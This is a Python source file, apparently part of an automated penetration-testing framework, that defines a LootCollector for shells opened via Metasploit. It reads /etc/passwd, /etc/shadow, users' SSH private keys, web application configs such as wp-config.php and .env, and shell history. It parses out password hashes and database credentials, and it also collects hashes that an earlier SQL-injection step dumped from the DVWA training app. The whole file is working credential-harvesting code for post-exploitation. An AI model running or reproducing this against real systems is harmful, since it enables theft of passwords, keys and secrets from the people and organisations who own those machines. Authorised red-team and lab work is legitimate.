"""
LootCollector — harvest credentials and sensitive files from shell sessions.

Collection targets:
  /etc/passwd        — user account list
  /etc/shadow        — password hashes (requires root)
  /var/www/html/*    — web application config files (DB passwords)
  ~/.bash_history    — command history
  ~/.ssh/id_rsa      — private SSH keys
  /var/www/html/dvwa/config/config.inc.php  — DVWA DB credentials
  MySQL credentials  — from DVWA config
  SQLi-extracted     — credentials obtained during exploitation phase

All loot is stored as LootItem domain objects and appended to the session.
"""

from __future__ import annotations

import re

from loguru import logger

from artasf.core.models import EngagementSession, LootItem, PostExploitData
from artasf.exploit.msf_rpc import MSFClient
from artasf.post.session import SessionShell

_DVWA_CONFIG_PATHS = [
    "/var/www/html/dvwa/config/config.inc.php",
    "/var/www/dvwa/config/config.inc.php",
    "/srv/www/htdocs/dvwa/config/config.inc.php",
]

_WEB_CONFIG_PATHS = [
    "/var/www/html/wp-config.php",
    "/var/www/html/config.php",
    "/var/www/html/.env",
    "/var/www/html/application/config/database.php",
]

_HISTORY_FILES = ["~/.bash_history", "~/.zsh_history", "~/.ash_history"]

# Module paths that produce SQLi-extracted credentials
_SQLI_MODULES: frozenset[str] = frozenset({
    "custom/sqli",
    "custom/dvwa_sqli",
    "auxiliary/scanner/http/sqli",
})


class LootCollector:
    """
    Collects credentials and sensitive data from an open shell session.

    Args:
        session_id: MSF session ID.
        engagement: Active EngagementSession (loot appended here).
        msf:        Active MSFClient.
    """

    def __init__(
        self,
        session_id: int,
        engagement: EngagementSession,
        msf: MSFClient | None = None,
    ) -> None:
        self.session_id = session_id
        self.engagement = engagement
        self._msf       = msf

    async def collect(
        self,
        post_data: PostExploitData,
        msf: MSFClient | None = None,
    ) -> list[LootItem]:
        """
        Run all collection tasks and return new LootItem objects.

        Args:
            post_data: PostExploitData from the enumerator (used for target_id).
            msf:       MSFClient to use.
        """
        client = msf or self._msf
        if client is None:
            raise RuntimeError("LootCollector requires an MSFClient instance")

        shell  = SessionShell(client, self.session_id)
        target_id = post_data.target_id
        items: list[LootItem] = []

        logger.info("Loot collection on session {} (target={})", self.session_id, target_id[:8])

        # 1. /etc/passwd
        items += await self._collect_passwd(shell, target_id)

        # 2. /etc/shadow (root only)
        items += await self._collect_shadow(shell, target_id)

        # 3. SSH private keys
        items += await self._collect_ssh_keys(shell, target_id)

        # 4. DVWA DB config
        items += await self._collect_dvwa_config(shell, target_id)

        # 5. Generic web configs
        items += await self._collect_web_configs(shell, target_id)

        # 6. Shell history
        items += await self._collect_history(shell, target_id)

        # 7. Credentials extracted by the SQLi module
        items += self._collect_sqli_creds(target_id)

        logger.info("Loot collection complete: {} item(s)", len(items))
        return items

    # ------------------------------------------------------------------
    # Collectors
    # ------------------------------------------------------------------

    async def _collect_passwd(
        self, shell: SessionShell, target_id: str
    ) -> list[LootItem]:
        out = await shell.run_safe("cat /etc/passwd")
        if not out:
            return []
        logger.debug("/etc/passwd retrieved ({} lines)", out.count("\n"))
        return [LootItem(
            session_id=self.engagement.id,
            target_id=target_id,
            type="file",
            value=out,
            source="/etc/passwd",
        )]

    async def _collect_shadow(
        self, shell: SessionShell, target_id: str
    ) -> list[LootItem]:
        out = await shell.run_safe("cat /etc/shadow 2>/dev/null")
        if not out or "Permission denied" in out:
            return []
        logger.warning("/etc/shadow readable — {} hashes", out.count(":"))
        items: list[LootItem] = [LootItem(
            session_id=self.engagement.id,
            target_id=target_id,
            type="hash",
            value=out,
            source="/etc/shadow",
        )]
        # Parse individual hashes
        for line in out.splitlines():
            parts = line.split(":")
            if len(parts) >= 2 and parts[1] not in ("*", "!", "x", ""):
                items.append(LootItem(
                    session_id=self.engagement.id,
                    target_id=target_id,
                    type="hash",
                    value=f"{parts[0]}:{parts[1]}",
                    source="/etc/shadow",
                ))
        return items

    async def _collect_ssh_keys(
        self, shell: SessionShell, target_id: str
    ) -> list[LootItem]:
        items: list[LootItem] = []
        # Check home dirs
        homedirs_out = await shell.run_safe("cat /etc/passwd | cut -d: -f6 | sort -u")
        dirs = [d.strip() for d in homedirs_out.splitlines() if d.strip().startswith("/")]

        for d in dirs:
            key_path = f"{d}/.ssh/id_rsa"
            key = await shell.run_safe(f"cat {key_path} 2>/dev/null")
            if key and "BEGIN" in key:
                logger.warning("SSH private key found: {}", key_path)
                items.append(LootItem(
                    session_id=self.engagement.id,
                    target_id=target_id,
                    type="credential",
                    value=key,
                    source=key_path,
                ))
        return items

    async def _collect_dvwa_config(
        self, shell: SessionShell, target_id: str
    ) -> list[LootItem]:
        items: list[LootItem] = []
        for path in _DVWA_CONFIG_PATHS:
            content = await shell.run_safe(f"cat {path} 2>/dev/null")
            if not content:
                continue

            logger.warning("DVWA config found at {}", path)
            items.append(LootItem(
                session_id=self.engagement.id,
                target_id=target_id,
                type="file",
                value=content,
                source=path,
            ))

            # Extract DB credentials from config
            for user, pw in _parse_php_credentials(content):
                logger.warning("DB credential extracted from {}: {}:***", path, user)
                items.append(LootItem(
                    session_id=self.engagement.id,
                    target_id=target_id,
                    type="credential",
                    value=f"{user}:{pw}",
                    source=path,
                ))
            break  # stop after first match
        return items

    async def _collect_web_configs(
        self, shell: SessionShell, target_id: str
    ) -> list[LootItem]:
        items: list[LootItem] = []
        for path in _WEB_CONFIG_PATHS:
            content = await shell.run_safe(f"cat {path} 2>/dev/null")
            if not content:
                continue
            logger.warning("Web config found: {}", path)
            items.append(LootItem(
                session_id=self.engagement.id,
                target_id=target_id,
                type="file",
                value=content,
                source=path,
            ))
        return items

    async def _collect_history(
        self, shell: SessionShell, target_id: str
    ) -> list[LootItem]:
        items: list[LootItem] = []
        for path in _HISTORY_FILES:
            out = await shell.run_safe(f"cat {path} 2>/dev/null | tail -100")
            if not out:
                continue
            items.append(LootItem(
                session_id=self.engagement.id,
                target_id=target_id,
                type="file",
                value=out,
                source=path,
            ))
            # Flag any credential-looking lines
            for line in out.splitlines():
                if re.search(r"(password|passwd|secret|token)", line, re.IGNORECASE):
                    logger.warning("History contains sensitive term: {}", line)
        return items

    def _collect_sqli_creds(self, target_id: str) -> list[LootItem]:
        """
        Convert credentials extracted by the DVWA SQLi module into LootItems.
        They live in ExploitAttempt output — parse and re-expose them here.
        """
        items: list[LootItem] = []
        for attempt in self.engagement.attempts:
            if attempt.target_id != target_id:
                continue
            if not any(m in attempt.module for m in _SQLI_MODULES):
                continue
            if not attempt.output:
                continue
            # Lines like: "[+] Credential: admin : 5f4dcc3b5aa765d61d8327deb882cf99 (MD5)"
            for m in re.finditer(
                r"\[\+\] Credential:\s*(\S+)\s*:\s*([a-f0-9]{32})", attempt.output
            ):
                items.append(LootItem(
                    session_id=self.engagement.id,
                    target_id=target_id,
                    type="credential",
                    value=f"{m.group(1)}:{m.group(2)}",
                    source="sqli_dump",
                ))
        return items


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _parse_php_credentials(php: str) -> list[tuple[str, str]]:
    """Extract $_DVWA['db_user'] / $_DVWA['db_password'] pairs from PHP config."""
    pairs: list[tuple[str, str]] = []
    # Matches both $_DVWA['db_user'] and $_DVWA[ 'db_user' ] (DVWA uses spaces)
    user_m = re.search(r"\[\s*['\"]?db_user['\"]?\s*\]\s*=\s*['\"]([^'\"]+)['\"]", php)
    pass_m = re.search(r"\[\s*['\"]?db_password['\"]?\s*\]\s*=\s*['\"]([^'\"]*)['\"]", php)
    if user_m and pass_m:
        pairs.append((user_m.group(1), pass_m.group(1)))
    return pairs
